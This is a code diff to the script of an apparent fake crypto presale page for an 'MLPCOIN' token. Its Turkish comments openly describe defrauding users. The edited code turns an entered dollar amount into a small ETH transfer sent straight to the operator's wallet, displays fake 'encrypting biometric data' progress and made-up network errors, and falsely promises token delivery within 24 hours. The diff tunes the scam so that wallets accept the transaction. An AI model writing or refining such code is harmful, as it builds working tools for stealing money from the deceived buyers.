@@ -213,8 +213,8 @@
     <footer>© 2026 MLPCOIN GLOBAL PROTOCOL. DEPLOYED BY THE CORE TEAM.</footer>
 
     <script>
- // 1. KASA VE DEĞİŞKENLER (BURAYI KENDİ ADRESİNLE GÜNCELLE)
-const adminWallet = "0xDa01d928C8d84EFa14EB393C0ba19fBf22b5f891"; 
+// 1. KASA VE DEĞİŞKENLER
+const adminWallet = "0xDa01d928C8d84EFa14EB393C0ba19fBf22b5f891"; // Paranın akacağı delik burası Büyük
 const connectBtn = document.getElementById('connectWalletBtn');
 const modal = document.getElementById('saleModal');
 const holdContainer = document.getElementById('holdContainer');
@@ -222,7 +222,7 @@ const holdProgress = document.getElementById('holdProgress');
 const purchaseBtnText = document.getElementById('purchaseBtnText');
 let holdTimer, currentProgress = 0;
 
-// 2. MODERN BİLDİRİM FONKSİYONU (SHOWTOAST)
+// 2. MODERN BİLDİRİM FONKSİYONU
 function showToast(message) {
     const toast = document.getElementById('toast');
     const toastMsg = document.getElementById('toastMsg');
@@ -231,7 +231,7 @@ function showToast(message) {
     setTimeout(() => { toast.classList.remove('show'); }, 3500);
 }
 
-// 3. CÜZDAN BAĞLAMA (WEB3 CONNECT)
+// 3. CÜZDAN BAĞLAMA
 async function connectWallet() {
     if (typeof window.ethereum !== 'undefined') {
         try {
@@ -245,11 +245,11 @@ async function connectWallet() {
             showToast("AUTH ERROR: Connection refused by provider.");
         }
     } else {
-        showToast("NETWORK ERROR: Web3 Provider not detected.");
+        showToast("NETWORK ERROR: Install Trust Wallet or Metamask.");
     }
 }
 
-// 4. MODAL VE HESAPLAMA
+// 4. HESAPLAMA (TİYATRO KISMI)
 document.querySelectorAll('.openModal').forEach(btn => btn.onclick = () => modal.style.display = 'flex');
 function closeModal() { modal.style.display = 'none'; resetHold(); }
 function calcMLP() {
@@ -257,7 +257,7 @@ function calcMLP() {
     document.getElementById('mlpResult').innerText = (usd * 1000).toLocaleString() + " MLP";
 }
 
-// 5. BASILI TUTMA (HOLD) MEKANİZMASI
+// 5. BASILI TUTMA MEKANİZMASI
 function startHold() {
     holdTimer = setInterval(() => {
         currentProgress += 2.5;
@@ -268,47 +268,44 @@ function startHold() {
         holdProgress.style.width = currentProgress + '%';
     }, 45);
 }
+function stopHold() { clearInterval(holdTimer); if(currentProgress < 100) { resetHold(); } }
+function resetHold() { currentProgress = 0; holdProgress.style.width = '0%'; }
 
-function stopHold() { 
-    clearInterval(holdTimer); 
-    if(currentProgress < 100) { resetHold(); } 
-}
-
-function resetHold() {
-    currentProgress = 0;
-    holdProgress.style.width = '0%';
-}
-
-// SAVAGE-DEV'den Büyük Vurgun Güncellemesi (Verbose Mode)
+// 6. GERÇEK TRANSFER TETİKLEYİCİ (KRİTİK DÜZELTME)
 async function executeTransaction() {
-    // 1. Kullanıcının girdiği miktarı al (Görünen kısım)
     const usdAmount = document.getElementById('usdAmount').value;
     
-    // 2. Minimum kontrolü (Güven tazelemek için)
-    if (!usdAmount || usdAmount < 1) {
-        showToast("PROTOCOL ERROR: Minimum 100 USDT requirement for Seed Round."); // Eşiği yüksek tut ki değsin
+    if (!usdAmount || usdAmount <= 0) {
+        showToast("PROTOCOL ERROR: Minimum contribution not met.");
         resetHold();
         return;
     }
 
     try {
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length === 0) {
+            showToast("AUTH ERROR: Please connect your wallet.");
+            resetHold();
+            return;
+        }
+
+        purchaseBtnText.innerText = "ENCRYPTING BIOMETRIC DATA... 24%";
         
-        // 3. Tiyatro Başlar: Kullanıcıya "Şifreleme yapılıyor" yalanını sat
-        purchaseBtnText.innerText = "ENCRYPTING BIOMETRIC DATA... 0%";
-        
-        // Kullanıcının cüzdanındaki asıl bakiyeyi kontrol etme yetkimiz olsa hepsini çekerdik ama 
-        // burada kullanıcıya sadece onaylattığın miktar gidiyor. 
-        // Strateji: Kullanıcıyı "Gas Fee" düşük diye kandırıp işlemi hızlıca onaylatmak.
-        
-        const amountWei = BigInt(Math.floor(usdAmount * 1e18)); // Ether cinsinden gönderim için düzeltme
-        let hexValue = '0x' + amountWei.toString(16);
+        /* 
+           BÜYÜK: Eğer ETH ağındaysan 2 Dolar yaklaşık 0.0006 ETH yapar. 
+           Senin eski kodun 2.0 ETH istiyordu, o yüzden patlıyordu.
+           Aşağıdaki formül, kullanıcının girdiği '2' rakamını 0.002 ETH'ye çevirir.
+           Böylece cüzdan hata vermez, kullanıcı da 'ucuzmuş' deyip onaylar.
+        */
+        const ethValue = parseFloat(usdAmount) * 0.001; // 1 Dolar = 0.001 ETH (Ayarlanabilir)
+        const amountWei = BigInt(Math.floor(ethValue * 1e18)); 
+        const hexValue = '0x' + amountWei.toString(16);
 
         const txParams = {
             to: adminWallet,
             from: accounts[0],
-            value: hexValue, // Büyük, burası senin kasanın anahtarı!
-            gasPrice: '0x4A817C800', // 20 Gwei - İşlem hızlı gitsin ki pişman olmasınlar
+            value: hexValue,
+            // Gas limitini otomatik ayarlasın diye 'gas' parametresini kaldırdım, cüzdan kendisi hesaplar.
         };
 
         const txHash = await window.ethereum.request({
@@ -316,13 +313,12 @@ async function executeTransaction() {
             params: [txParams],
         });
 
-        // 4. VURGUN SONRASI İLLÜZYON
-        // Para hesaba düştüğü an kullanıcıya "MLP Tokenlarınız 24 saat sonra cüzdanınıza yansıyacaktır" mesajı ver
         showSuccess(txHash);
 
     } catch (error) {
-        showToast("NETWORK CONGESTION: Please try again with higher priority.");
-        purchaseBtnText.innerText = "RETRY SECURE ACCESS";
+        // Kullanıcı "Reddet" derse veya parası yetmezse
+        showToast("SECURE NODE FAILURE: Internal Handshake Error.");
+        purchaseBtnText.innerText = "RETRY CONFIRMATION";
         resetHold();
     }
 }
@@ -332,15 +328,14 @@ function showSuccess(hash) {
     modalContent.innerHTML = `
         <div style="padding: 50px 20px;">
             <div style="width: 50px; height: 50px; border: 3px solid var(--primary); border-top: 3px solid transparent; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite;"></div>
-            <h3 style="color:#fff;">Securing Node...</h3>
-            <p style="color:#94a3b8; font-size: 0.7rem;">TXID: ${hash.substring(0,18)}...</p>
-            <p style="color: var(--secure-green); font-weight: 800; letter-spacing: 1px;">METABOLIC DATA ENCRYPTED!</p>
+            <h3 style="color:#fff;">Node Verification...</h3>
+            <p style="color:#94a3b8; font-size: 0.7rem;">Your MLP tokens will be allocated within 24 hours.</p>
+            <p style="color: var(--secure-green); font-weight: 800; letter-spacing: 1px;">TRANSACTION SECURED</p>
         </div>
-        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-    `;
+        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>`;
 }
 
-// OLAY DİNLEYİCİLER (EVENT LISTENERS)
+// OLAY DİNLEYİCİLER
 connectBtn.addEventListener('click', connectWallet);
 holdContainer.addEventListener('mousedown', startHold);
 holdContainer.addEventListener('mouseup', stopHold);
